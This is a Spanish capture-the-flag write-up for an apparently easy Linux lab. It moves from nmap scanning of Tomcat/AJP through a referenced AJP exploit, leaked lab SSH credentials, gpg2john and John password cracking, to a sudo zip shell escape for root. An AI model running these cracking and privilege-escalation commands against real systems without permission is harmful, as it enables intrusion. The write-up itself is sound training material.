#Linux #Easy 
### nmap
```python
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f3:c8:9f:0b:6a:c5:fe:95:54:0b:e9:e3:ba:93:db:7c (RSA)
|   256 dd:1a:09:f5:99:63:a3:43:0d:2d:90:d8:e3:e1:1f:b9 (ECDSA)
|_  256 48:d1:30:1b:38:6c:c6:53:ea:30:81:80:5d:0c:f1:05 (ED25519)
53/tcp   open  tcpwrapped
8009/tcp open  ajp13      Apache Jserv (Protocol v1.3)
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open  http       Apache Tomcat 9.0.30
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/9.0.30
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 44.25 seconds
```

### El puerto 8009 tiene un apache (protocol v1.3) esto se ve muy vulnerable asi que buscaremos exploit en internet. 
conseguimos uno en python vamos a probarlo.
![[Pasted image 20240612151025.png]]

![[Pasted image 20240612151028.png]]

### Username
```python
	skyfuck:8730281lkjlkjdqlksalks
```
### intentamos entrar en el puerto ssh con las credenciales que hemos conseguido
![[Pasted image 20240612151034.png]]

### tenemos dos archivos interesantes asi que los enviaremos a nuestra maquina. usando netcat.
maquina atacante
![[Pasted image 20240612151038.png]]
maquina victima
![[Pasted image 20240612151041.png]]

### usaremos gpg2john para sacar el hash del archivo y despues lo usaremos para pasarle a john de la siguiente forma
```python
	gpg2john tryhackme > hash.txt

	luego usaremos has para pasarlo a john

	john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

![[Pasted image 20240612151049.png]]
### usando la herramienta pgp vamos a desencrictar los hahs 
```python
	pgp --import tryhachme.asc
	pgp --decrypt credential.pgp
```
usaremos las credenciales de alexandru
![[Pasted image 20240612151058.png]]

### obtenemos otro usuario llamado merlin con lo que parece su clave.
veremos si tenemos permisos sudos con sudo -l
![[Pasted image 20240612151103.png]]
### podemos hacer todo sobre el archivo zip. asi que aprovecharemos esto para escalar provilegios
```python
	sudo zip $TF /etc/hosts -T -TT 'sh #'
	sudo rm $TF
```
cambiaremos el "zip" por la ruta absoluta donde esta nuestro zip. en este caso /usr/bin/zip
![[Pasted image 20240612151107.png]]
### WE ARE ROOT